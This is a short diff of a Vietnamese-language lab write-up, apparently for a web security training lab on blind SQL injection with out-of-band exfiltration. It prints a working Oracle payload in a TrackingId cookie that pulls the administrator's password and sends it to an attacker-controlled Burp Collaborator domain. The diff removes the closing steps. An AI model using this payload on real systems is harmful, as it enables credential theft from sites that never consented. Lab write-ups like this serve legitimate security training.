@@ -19,7 +19,3 @@ Em dùng payload ghép password vào subdomain rồi ép DB gọi ra Burp Collab
 TrackingId=xyz'||(SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.YOUR-COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)||'
 
 Sau khi gửi request, vào Collaborator sẽ thấy DNS/HTTP interaction chứa phần password ở subdomain.
-
-Copy password đó rồi đăng nhập administrator là solve lab.
-
-Lab này mấu chốt là chuyển dữ liệu nhạy cảm ra ngoài qua kênh OOB thay vì đọc trực tiếp trên response.
